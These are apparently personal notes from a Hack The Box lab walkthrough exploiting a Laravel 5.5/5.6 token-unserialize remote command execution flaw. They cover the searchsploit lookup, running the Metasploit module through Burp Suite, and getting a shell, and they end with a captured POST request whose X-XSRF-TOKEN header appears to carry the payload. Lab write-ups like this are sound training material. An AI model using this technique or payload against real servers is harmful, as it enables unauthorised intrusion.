
When we open this url http://dev-staging-01.academy.htb/ we get this output 
![[Pasted image 20230810042331.png]]

There is some issue with laravel and let's search if it's having any any exploits in searchsploit.
![[Pasted image 20230810042426.png]]

Will use the Metasploit and see if we get something
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)                    | linux/remote/47129.rb

![[Pasted image 20230810045124.png]]

We are setting the proxies to BURPSUITE which is the trick so that we can get the token
![[Pasted image 20230810045635.png]]
Everything is set as it should have.
We forget to set ReverseAllowProxy true

![[Pasted image 20230810045928.png]]
We got the command shell open

**Burp Suite**
POST /index.php HTTP/1.1

Host: dev-staging-01.academy.htb

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36

X-XSRF-TOKEN: eyJpdiI6IlRhVlBYZElaT3V2YzJSbU83RzJVa1E9PSIsInZhbHVlIjoiakF1MlZGaGpsQWFmSzcwTG1nXC9PNVBXUEpBT1FhVEVVWmhDa1pzZkREZUhIUEE3SGp5XC8zTEFkTGpuOWtXRXBnUVVMbUNiSWk1MjRjME10dnZmOUdVZmU1blRIcVAzSjVrNmhQdGY5UVB5MnpaN3pGekxQZXJ2UzBOeGFxMFwvME1tTWlTQ0ZqNWlSWXlXcGw5Sys5ZnI5QVkwOHhVbjM1TjAwM2FtcTJvYUgyNkpxY1liSkRBY0pcLzFra21KQW5laGl2QitiRHU4UzczNFo1bEpZN0lodjN6NHVkaU1VdVwvVXVOaGNvZUdVMzZcL3kySjZhNDJPNTNvVlRrc2VNRzI0M1ZNSVlDNXFtVGU3dFpxQUZDcE9TazZ3amNsTFhnR0FOMDFwejBqWE54RnJuNVJFVE1qQ2RTYXNreUFMUld0WTFlNjZzYW1GRisrYWRxTU5yRlY1VnI0SzU2cGwrY0srK1VFVjRMNDllZFBTc1dQb0dsZDh2ZFhoWHRLcnRCSDlncXVpK0pQemdxbU9IcnMwblBaWWpBNWFsbnJrb1NpeEE3bUVQUjJNcVNzWDdpbjMzUytGR0lcLzl2TmdacnY0OW9RdTVOM1VCNWp1S3Qrd2c1NmFPeTJINUdHQUNaTzZXYUR5MmpuZ2hnSXZTNFVmV0JScVRRTzI5TFwvVDBFYUI0VGpmd3B6RlBhYnlSNWlQUFNiUkJHYTVuK2ZqSUk3OFh6QzRiaE9ybU5RemM9IiwibWFjIjoiYTA3YTljZTY5ZDZhNjY1YTY3YzI3ZjNkNjExZmVhZTlmOGY5ODdmZjBkOWU2NGIxOTk2M2U0ZDM3ODg5MjI0MiJ9

Content-Type: application/x-www-form-urlencoded

Content-Length: 0

Connection: close


